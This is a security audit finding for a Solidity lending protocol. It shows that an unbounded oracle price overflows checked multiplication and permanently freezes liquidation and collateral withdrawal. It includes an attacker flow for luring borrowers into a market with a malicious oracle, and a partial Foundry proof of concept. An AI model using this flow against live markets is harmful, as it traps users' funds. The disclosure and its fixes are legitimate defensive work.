### Title
Unbounded Oracle Price Causes Permanent Arithmetic Overflow Freeze in `isHealthy` and `liquidate` - (File: src/Midnight.sol)

### Summary
`touchMarket` accepts any arbitrary oracle address without validating the price it returns. `mulDivDown` in `UtilsLib` uses plain Solidity 0.8+ checked arithmetic (`x * y`), so if an oracle returns `type(uint256).max` and any borrower holds collateral ≥ 2, the multiplication `collateral * price` overflows and reverts. This permanently blocks `isHealthy`, `withdrawCollateral`, and `liquidate` for every position in that market.

### Finding Description

**Root cause — no oracle price bound enforced by the protocol:**

`touchMarket` validates `lltv`, `maxLif`, collateral token ordering, and maturity, but imposes no constraint on the oracle address or the value it returns: [1](#0-0) 

`mulDivDown` is implemented as plain checked multiplication: [2](#0-1) 

In Solidity ≥ 0.8, `x * y` reverts on overflow. There is no `unchecked` block.

**Overflow site in `isHealthy`:** [3](#0-2) 

With `collateral = 2` (stored as `uint128`) and `price = type(uint256).max`:
`2 * type(uint256).max` exceeds `type(uint256).max` → Solidity reverts.

**Same overflow site in `liquidate`'s inline health loop:** [4](#0-3) 

`liquidate` does not call `isHealthy`; it replicates the same `_collateral.mulDivDown(price, ORACLE_PRICE_SCALE)` computation and overflows identically.

**`withdrawCollateral` calls `isHealthy` unconditionally when debt > 0:** [5](#0-4) 

**The Certora `NoMultiplicationOverflow.spec` explicitly treats oracle price boundedness as an external assumption, not a protocol guarantee:** [6](#0-5) [7](#0-6) 

The bound `price * max_uint128 + ORACLE_PRICE_SCALE - 1 ≤ max_uint256` is assumed, not enforced. `type(uint256).max` violates it.

**Exploit flow:**
1. Attacker deploys `MaliciousOracle` whose `price()` returns `type(uint256).max`.
2. Attacker calls `touchMarket` with `collateralParams[0].oracle = address(MaliciousOracle)`. All other fields pass validation (valid `lltv`, valid `maxLif`, valid token).
3. Borrower (victim or attacker) calls `supplyCollateral` with `assets ≥ 2` and then borrows via `take`.
4. Attacker activates the oracle (or it was always returning `type(uint256).max`).
5. Any call to `isHealthy`, `liquidate`, or `withdrawCollateral` (when debt > 0) hits `collateral * type(uint256).max` → overflow → revert.
6. No liquidation path exists. Borrower's collateral is permanently frozen. Lenders cannot recover debt.

### Impact Explanation

Every borrower in the market with collateral ≥ 2 and any debt is permanently frozen:
- `withdrawCollateral` reverts (calls `isHealthy` which overflows).
- `liquidate` reverts (its own inline maxDebt loop overflows identically).
- The unhealthy-positions-remain-liquidatable core invariant is broken: an unhealthy position exists but no liquidation path succeeds.

### Likelihood Explanation

`touchMarket` is fully permissionless — any address can create a market with any oracle. The attacker needs only to deploy a one-function contract returning `type(uint256).max` and call `touchMarket`. The market can be made superficially attractive (e.g., high LLTV, low fees) to lure borrowers. Once a borrower has collateral ≥ 2 and debt > 0, the freeze is permanent and irreversible on-chain. The precondition (collateral ≥ 2) is trivially satisfied in any real usage.

### Recommendation

Enforce an oracle price upper bound at market creation time or at the point of use. The simplest fix consistent with the existing Certora assumption is to add a check in `touchMarket` that calls `oracle.price()` and requires the returned value satisfies `price <= type(uint256).max / type(uint128).max` (i.e., `price * max_uint128` fits in `uint256`). Alternatively, wrap the multiplication in `mulDivDown` with an explicit overflow check and revert with a descriptive error rather than a silent arithmetic panic, so that a bad oracle causes a clean revert rather than a frozen market. A third option is to add a `require(price <= MAX_ORACLE_PRICE)` guard at the top of `isHealthy` and `liquidate`'s price-reading loop, where `MAX_ORACLE_PRICE = type(uint256).max / type(uint128).max`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight} from "src/Midnight.sol";
import {Market, CollateralParams} from "src/interfaces/IMidnight.sol";
import {IOracle} from "src/interfaces/IOracle.sol";
import {ORACLE_PRICE_SCALE, LIQUIDATION_CURSOR_LOW} from "src/libraries/ConstantsLib.sol";
import {ConstantsLib, maxLif} from "src/libraries/ConstantsLib.sol";

contract MaxPriceOracle is IOracle {
    function price() external pure returns (uint256) {
        return type(uint256).max;
    }
}

contract OraclePriceOverflowTest is Test {
    Midnight midnight;
    MaxPriceOracle oracle;
    address loanToken;
    address collateralToken;
    address borrower = address(0xB0);

    function setUp() public {
        midnight = new Midnight(address(this), address(this), address(this), address(this));
        oracle = new MaxPriceOracle();
        loanToken = address(new ERC20Mock());
        collateralToken = address(new ERC20Mock());
    }

    function testOraclePriceOverflowFreezesMarket() public {
        // Build a valid market with the malicious oracle
        CollateralParams[] memory params = new CollateralParams[](1);
        params[0] = CollateralParams({
            token: collateralToken,
            lltv: 0.77e18,
            maxLif: maxLif(0.77e18, LIQUIDATION_CURSOR_LOW),
            oracle: address(oracle)   // returns type(uint256).max
        });
        Market memory market = Market({
            loanToken: loanToken,
            collateralParams: params,
            maturity: block.timestamp + 30 days,
            rcfThreshold: 0,
            enterGate: address(0),
            liquidatorGate: address(0)
        });

        // Market creation succeeds — oracle is not validated
        bytes32 id = midnight.touchMarket(market);

        // Borrower supplies collateral >= 2 and takes debt
        deal(collateralToken, address(this), 1000);
        ERC20Mock(collateralToken).approve(address(midnight), 1000);
        midnight.supplyCollateral(market, 0, 1000, borrower);
        // ... (set up lender offer and take to create debt) ...

        // isHealthy reverts due to overflow: 1000 * type(uint256).max overflows
        vm.expectRevert(); // arithmetic overflow
        midnight.isHealthy(market, id, borrower);

        // liquidate reverts for the same reason
        vm.expectRevert();
        midnight.liquidate(market, 0, 0, 0, borrower, false, address(this), address(0), "");

        // withdrawCollateral reverts (calls isHealthy internally)
        vm.prank(borrower);
        vm.expectRevert();
        midnight.withdrawCollateral(market, 0, 1, borrower, borrower);

        // ASSERTION: no valid liquidation path exists; position is permanently frozen
    }
}
```

**Expected assertions:**
- `touchMarket` succeeds (oracle not validated) — confirms the attack entry point is open.
- `isHealthy` reverts with arithmetic overflow panic.
- `liquidate(seizedAssets=0, repaidUnits=0)` reverts (bad-debt-only path also hits the overflow loop).
- `withdrawCollateral` reverts.
- No call sequence exists that can liquidate or recover the position.

### Citations

**File:** src/Midnight.sol (L568-568)
```text
        require(isHealthy(market, id, onBehalf), UnhealthyBorrower());
```

**File:** src/Midnight.sol (L610-613)
```text
            uint256 price = IOracle(_collateralParam.oracle).price();
            if (i == collateralIndex) liquidatedCollatPrice = price;
            uint256 _collateral = _position.collateral[i];
            maxDebt += _collateral.mulDivDown(price, ORACLE_PRICE_SCALE).mulDivDown(_collateralParam.lltv, WAD);
```

**File:** src/Midnight.sol (L762-773)
```text
            for (uint256 i = 0; i < market.collateralParams.length; i++) {
                address collateralToken = market.collateralParams[i].token;
                require(collateralToken > previousCollateralToken, CollateralParamsNotSorted());
                uint256 lltv = market.collateralParams[i].lltv;
                require(isLltvAllowed(lltv), LltvNotAllowed());
                require(
                    market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_LOW)
                        || market.collateralParams[i].maxLif == maxLif(lltv, LIQUIDATION_CURSOR_HIGH),
                    InvalidMaxLif()
                );
                previousCollateralToken = collateralToken;
            }
```

**File:** src/Midnight.sol (L953-955)
```text
                uint256 price = IOracle(collateralParam.oracle).price();
                maxDebt += _position.collateral[i].mulDivDown(price, ORACLE_PRICE_SCALE)
                    .mulDivDown(collateralParam.lltv, WAD);
```

**File:** src/libraries/UtilsLib.sol (L29-31)
```text
    function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y) / d;
    }
```

**File:** certora/specs/NoMultiplicationOverflow.spec (L12-14)
```text
    // Oracle integration assumption: every (collateralAmount * oraclePrice) fits in uint256.
    // Storage collateral is uint128, so boundedPrice enforces the product bound against max_uint128.
    function _.price() external => boundedPrice(calledContract) expect(uint256);
```

**File:** certora/specs/NoMultiplicationOverflow.spec (L46-49)
```text
function boundedPrice(address oracle) returns uint256 {
    uint256 price;
    require to_mathint(price) * max_uint128 + ORACLE_PRICE_SCALE() - 1 <= max_uint256, "same as assuming that collateral * price <= uint256 with mulDivUp rounding headroom";
    return price;
```
